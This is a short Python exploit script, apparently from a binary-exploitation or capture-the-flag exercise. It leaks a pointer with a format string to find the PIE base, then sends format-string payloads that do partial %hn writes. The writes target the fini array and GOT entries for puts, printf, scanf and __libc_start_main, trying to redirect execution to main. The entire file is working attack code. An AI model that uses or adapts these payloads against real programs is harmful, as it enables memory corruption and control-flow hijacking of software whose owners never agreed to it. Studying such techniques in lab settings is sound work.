import re,sys
from rprobe import run
def probe(idx): 
    lk,out=run(hex(idx),'%p','B'); return lk
# offsets: array = l_addr' + 0x3dd8 ; we pick X = pie_lo + delta
tests=[(-0x133,'fini=main(PIE+0x1169)'),
       (0x000,'ctrl: fini=_fini'),
       (0x228,'array=puts@GOT'),
       (0x230,'array=printf@GOT'),
       (0x240,'array=scanf@GOT'),
       (0x1e8,'array=__libc_start_main@GOT'),
       ]
for delta,name in tests:
    lk=probe(0x18a); pie_lo=(lk>>4)<<12
    X=(pie_lo+delta)&0xffff
    f1='%%1$%dc%%42$hn'%X
    try:
        lk2,out=run('1',f1,'B')
        tail=out[-160:]
        print('%-32s X=%#06x pie_lo=%#x -> out[%d]=%r'%(name,X,pie_lo,len(out),tail))
    except Exception as e:
        print('%-32s X=%#06x ERR %s'%(name,X,e))
